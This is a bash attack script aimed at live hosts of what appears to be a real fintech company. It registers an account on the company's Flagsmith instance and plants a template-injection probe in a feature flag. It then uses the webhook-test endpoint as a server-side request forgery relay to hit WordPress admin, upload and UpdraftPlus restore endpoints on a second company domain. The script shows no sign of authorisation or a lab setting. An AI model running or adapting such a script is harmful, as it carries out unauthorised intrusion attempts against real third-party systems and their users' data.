#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register with better password
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-v15-scan@proton.me","password":"Hy7Nm3Qw9Rt!","first_name":"T","last_name":"S"}' --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"
[ -z "$KEY" ] && echo "Reg: $ACCT" && exit 1

# Quick setup
OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"name":"t"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Setup: Org=$OID Proj=$PID Env=$EKEY"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

# Create feature with SSTI payload
echo "=== SSTI VIA FEATURE ==="
feat=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/${PID}/features/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"name":"ssti_test","type":"FLAG","default_enabled":true,"initial_value":"{{7*7}}"}' --max-time 10)
echo "Feature created: $(echo $feat | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get("id","FAIL"))' 2>/dev/null)"

# Get flags to check if value was rendered
flags=$(curl -s "https://flagsmith.koinworks.com/api/v1/flags/" \
  -H "X-Environment-Key: $EKEY" -H "User-Agent: $UA" --max-time 10)
echo "Flags: $(echo $flags | head -c 300)"
echo ""

# === SSRF TESTS ===
# Test 1: koinp2p.com admin-ajax with async-upload action (file upload!)
echo "=== ASYNC UPLOAD ==="
SSRF "https://koinp2p.com/wp-admin/async-upload.php"
echo ""

# Test 2: koinp2p.com admin-post.php
echo "=== ADMIN POST ==="
SSRF "https://koinp2p.com/wp-admin/admin-post.php"
echo ""

# Test 3: koinp2p.com wp-json namespaces (discover REST APIs)
echo "=== WP REST NAMESPACES ==="
SSRF "https://koinp2p.com/wp-json/"
echo ""

# Test 4: koinp2p.com UpdraftPlus restore (nopriv) with action=updraft_restore
echo "=== UPDRAFT RESTORE ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore&action=updraft_restore&backup_timestamp=1234567890&updraft_restore[]=plugins"
echo ""

# Test 5: Check if wp-json returns data (API discovery)
echo "=== WP JSON ROOT ==="
SSRF "https://koinp2p.com/?rest_route=/"
echo ""

# Test 6: koinp2p.com admin-ajax with plupload action (upload via AJAX) 
echo "=== PLUPLOAD ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=plupload_action"
echo ""
